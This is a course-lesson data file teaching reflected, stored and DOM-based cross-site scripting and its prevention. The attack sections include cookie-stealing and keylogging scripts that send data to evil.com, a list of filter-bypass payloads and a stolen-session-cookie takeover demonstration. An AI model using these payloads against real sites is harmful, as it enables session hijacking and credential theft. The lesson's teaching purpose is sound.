export const lesson = {
  id: 'L38',
  title: 'Cross-Site Scripting (XSS): Reflected, Stored & DOM',
  slug: 'xss-attacks',
  type: 'PRACTICAL',
  duration: 55,
  xpReward: 40,
  difficulty: 'advanced',
  module: { title: 'Web Application Security', slug: 'web-security' },
  course: { title: 'Web Security Fundamentals', slug: 'web-security-fundamentals' },
  keyTerms: [
    'XSS', 'Reflected XSS', 'Stored XSS', 'DOM-Based XSS',
    'Content Security Policy', 'Output Encoding', 'Input Sanitization',
    'Cookie Theft', 'Session Hijacking', 'JavaScript Injection'
  ],
  content: [
    { type: 'heading', content: 'Cross-Site Scripting (XSS): Reflected, Stored & DOM' },
    { type: 'paragraph', content: 'Cross-Site Scripting (XSS) allows attackers to inject malicious JavaScript into web pages viewed by other users. When a victim visits the page, the injected script runs in THEIR browser with THEIR session — stealing cookies, redirecting to phishing sites, or performing actions on their behalf.' },

    { type: 'callout', variant: 'info', content: 'Analogy: Imagine a community bulletin board at a coffee shop. XSS is like posting a note that says "Free WiFi! Scan this QR code" — but the QR code installs malware. Everyone who reads the board is a potential victim. The bulletin board (website) trusted the poster (attacker) to write a normal message, but they injected something malicious.' },

    { type: 'heading', level: 2, content: 'Why XSS is Dangerous' },
    { type: 'list', items: [
      'Steal session cookies — Attacker logs in as the victim without their password',
      'Keylogging — Capture everything the victim types (passwords, credit cards)',
      'Phishing — Replace the page content with a fake login form',
      'Cryptomining — Use victim\'s CPU to mine cryptocurrency',
      'Webcam/mic access — Social engineer permission through fake dialogs',
      'Worm propagation — XSS that spreads itself to other users (Samy worm, 2005)',
      'Full account takeover — Change email, password, and security questions'
    ]},

    { type: 'heading', level: 2, content: 'Type 1: Reflected XSS' },
    { type: 'paragraph', content: 'The malicious script is part of the URL or request. It\'s "reflected" back in the server\'s response. The victim must click a specially crafted link.' },

    { type: 'command', command: 'curl "http://target.com/search?q=<script>alert(document.cookie)</script>"', output: `<html>
<body>
  <h1>Search results for: <script>alert(document.cookie)</script></h1>
  <p>No results found.</p>
</body>
</html>`, explanation: 'The application reflects the search query directly into the HTML without encoding. The <script> tag executes in the victim\'s browser. alert(document.cookie) is the classic proof-of-concept.' },

    { type: 'paragraph', content: 'How the attacker exploits this:' },
    { type: 'list', items: [
      '1. Attacker finds a reflected XSS on target.com/search?q=',
      '2. Crafts a URL: target.com/search?q=<script>fetch("https://evil.com/steal?c="+document.cookie)</script>',
      '3. Sends the link to victim via email: "Click here to see your account status"',
      '4. Victim clicks link → script runs → cookies sent to attacker\'s server',
      '5. Attacker uses stolen session cookie to impersonate the victim'
    ]},

    { type: 'heading', level: 2, content: 'Type 2: Stored (Persistent) XSS' },
    { type: 'paragraph', content: 'The malicious script is permanently stored on the target server (in a database, comment field, forum post, user profile). Every user who views the page is affected — no special link needed.' },

    { type: 'command', command: 'cat malicious_comment.txt', output: `Great article! Very informative.
<script>
  // Steal session and send to attacker
  var img = new Image();
  img.src = "https://evil.com/collect?cookie=" + encodeURIComponent(document.cookie);
  
  // Also steal any saved credentials from password managers
  var forms = document.querySelectorAll('input[type=password]');
  forms.forEach(function(f) {
    f.addEventListener('input', function() {
      fetch('https://evil.com/keylog', {
        method: 'POST',
        body: JSON.stringify({field: f.name, value: f.value})
      });
    });
  });
</script>`, explanation: 'This comment looks normal at the start but contains hidden JavaScript. When ANY user views this comment, the script: (1) steals their session cookie, (2) logs any passwords they type on the page. Stored XSS is the most dangerous type because it affects every visitor.' },

    { type: 'callout', variant: 'security', content: 'Real-world impact: The Samy worm (2005) was a stored XSS on MySpace that added "Samy is my hero" to every profile that viewed an infected page. It spread to over 1 million users in 20 hours — the fastest-spreading virus in history at the time.' },

    { type: 'heading', level: 2, content: 'Type 3: DOM-Based XSS' },
    { type: 'paragraph', content: 'The vulnerability exists in client-side JavaScript code, not the server response. The malicious payload is processed by the DOM (Document Object Model) in the browser without ever being sent to the server.' },

    { type: 'command', command: 'cat vulnerable_page.html', output: `<html>
<body>
  <h1>Welcome!</h1>
  <div id="greeting"></div>
  <script>
    // VULNERABLE: Reads from URL fragment and inserts directly into DOM
    var name = document.location.hash.substring(1);
    document.getElementById('greeting').innerHTML = 'Hello, ' + name + '!';
    // URL: page.html#<img src=x onerror=alert(document.cookie)>
    // Result: Injects an img tag that executes JavaScript via onerror
  </script>
</body>
</html>`, explanation: 'The page reads from the URL hash (#fragment) and uses innerHTML to display it. An attacker crafts: page.html#<img src=x onerror=alert(1)>. The browser tries to load image "x", fails, and executes the onerror JavaScript. Server logs show nothing suspicious!' },

    { type: 'paragraph', content: 'DOM XSS sources (where attacker input enters) and sinks (where it gets executed):' },
    { type: 'list', items: [
      'Sources: document.location, document.URL, document.referrer, window.name, localStorage',
      'Dangerous Sinks: innerHTML, outerHTML, document.write(), eval(), setTimeout(string)',
      'Safe Alternatives: textContent, innerText, setAttribute() (for non-event attributes)'
    ]},

    { type: 'heading', level: 2, content: 'Advanced XSS Payloads' },
    { type: 'paragraph', content: 'Attackers use creative techniques to bypass basic filters:' },

    { type: 'command', command: 'cat xss_payloads.txt', output: `# Basic - often blocked by filters
<script>alert(1)</script>

# Event handlers - bypass script tag filters
<img src=x onerror=alert(1)>
<body onload=alert(1)>
<svg onload=alert(1)>
<input onfocus=alert(1) autofocus>

# Without parentheses (bypasses WAF rules blocking "alert(")
<img src=x onerror=alert\`1\`>

# Encoding bypass
<script>eval(atob('YWxlcnQoMSk='))</script>

# Breaking out of attributes
" onfocus="alert(1)" autofocus="
' onmouseover='alert(1)'

# Polyglot (works in multiple contexts)
jaVasCript:/*-/*\`/*\\x60/*'/*"/**/(/* */oNcliCk=alert(1) )//`, explanation: 'These payloads demonstrate why simple string filtering ("just block <script>") doesn\'t work. Attackers use event handlers, encoding, context-breaking, and creative syntax to bypass filters.' },

    { type: 'heading', level: 2, content: 'Cookie Theft: Full Attack Chain' },
    { type: 'paragraph', content: 'Let\'s see the complete attack from the attacker\'s perspective:' },

    { type: 'command', command: 'python3 -m http.server 8080', output: `Serving HTTP on 0.0.0.0 port 8080 ...
192.168.1.50 - - [15/Jun/2024 11:30:45] "GET /steal?cookie=session_id=abc123def456;%20user=admin HTTP/1.1" 200 -
192.168.1.51 - - [15/Jun/2024 11:31:12] "GET /steal?cookie=session_id=xyz789ghi012;%20user=john HTTP/1.1" 200 -`, explanation: 'The attacker runs a simple web server that logs incoming requests. Each request contains a stolen session cookie from a victim who viewed the XSS-infected page. The attacker now has valid session tokens for admin and john.' },

    { type: 'command', command: 'curl -H "Cookie: session_id=abc123def456" http://target.com/admin/dashboard', output: `<html>
<head><title>Admin Dashboard - Welcome admin!</title></head>
<body>
  <h1>Administration Panel</h1>
  <p>Users: 4,521 | Revenue: $123,456</p>
  ...`, explanation: 'Using the stolen admin cookie, the attacker accesses the admin dashboard without knowing the password. Full account takeover achieved through XSS.' },

    { type: 'heading', level: 2, content: 'Prevention: Defending Against XSS' },

    { type: 'heading', level: 3, content: '1. Output Encoding (Most Important)' },
    { type: 'paragraph', content: 'Encode special HTML characters before inserting user data into the page. This turns <script> into &lt;script&gt; which displays as text, not code.' },

    { type: 'command', command: 'cat secure_output.js', output: `// SECURE: Using a template engine with auto-escaping (React, Angular, etc.)
// React automatically escapes all rendered variables:
function SearchResults({ query }) {
  return <h1>Results for: {query}</h1>;
  // If query = "<script>alert(1)</script>"
  // React renders: "Results for: &lt;script&gt;alert(1)&lt;/script&gt;"
  // Displayed as TEXT, not executed as code
}

// DANGEROUS: React's escape hatch - NEVER use with user input
function UnsafeComponent({ userHtml }) {
  return <div dangerouslySetInnerHTML={{ __html: userHtml }} />;
  // This BYPASSES React's XSS protection!
}`, explanation: 'React, Vue, and Angular auto-escape by default — they\'re safe unless you explicitly use dangerous APIs like dangerouslySetInnerHTML or v-html. Frameworks are your best defense.' },

    { type: 'heading', level: 3, content: '2. Content Security Policy (CSP)' },
    { type: 'paragraph', content: 'CSP is an HTTP header that tells the browser which sources of JavaScript are allowed. Even if XSS is injected, CSP can prevent it from executing.' },

    { type: 'command', command: 'curl -I https://secure-site.com | grep content-security', output: `content-security-policy: default-src 'self'; script-src 'self' https://cdn.trusted.com; style-src 'self' 'unsafe-inline'; img-src *; connect-src 'self' https://api.secure-site.com`, explanation: 'This CSP allows scripts ONLY from the same origin and cdn.trusted.com. Injected inline scripts (<script>alert(1)</script>) are blocked because \'unsafe-inline\' is NOT in script-src. This is a strong XSS mitigation.' },

    { type: 'heading', level: 3, content: '3. HttpOnly and Secure Cookie Flags' },
    { type: 'command', command: 'cat set_cookie_header.txt', output: `Set-Cookie: session_id=abc123; HttpOnly; Secure; SameSite=Strict; Path=/`, explanation: 'HttpOnly: JavaScript cannot access this cookie (document.cookie won\'t show it) — defeats cookie theft XSS attacks. Secure: Only sent over HTTPS. SameSite=Strict: Not sent with cross-origin requests (also helps with CSRF).' },

    { type: 'heading', level: 3, content: '4. Input Sanitization Libraries' },
    { type: 'list', items: [
      'DOMPurify (JavaScript) — Sanitizes HTML, removes all XSS vectors',
      'bleach (Python) — Whitelist-based HTML sanitizer',
      'OWASP Java HTML Sanitizer — For Java applications',
      'Use these ONLY when you must allow some HTML (rich text editors)',
      'Prefer output encoding over input sanitization when possible'
    ]},

    { type: 'heading', level: 2, content: 'Summary & Security Implications' },
    { type: 'list', items: [
      'XSS is the most common web vulnerability — found on most websites during testing',
      'Reflected XSS requires victim to click a link; Stored XSS affects ALL visitors',
      'DOM XSS is invisible to servers — happens entirely in the browser',
      'Modern frameworks (React, Vue, Angular) prevent XSS by default — don\'t bypass their protections',
      'CSP is your safety net — even if XSS exists, CSP can prevent execution',
      'HttpOnly cookies prevent the most impactful XSS attack (session theft)',
      'Never use innerHTML, document.write(), or eval() with user-controlled data',
      'Test with XSS payloads during development, not just before production'
    ]},
  ],
  navigation: {
    prev: { title: 'SQL Injection: Discovery, Exploitation & Prevention', slug: 'sql-injection' },
    next: { title: 'Authentication Vulnerabilities & Session Management', slug: 'auth-vulnerabilities' },
  },
};
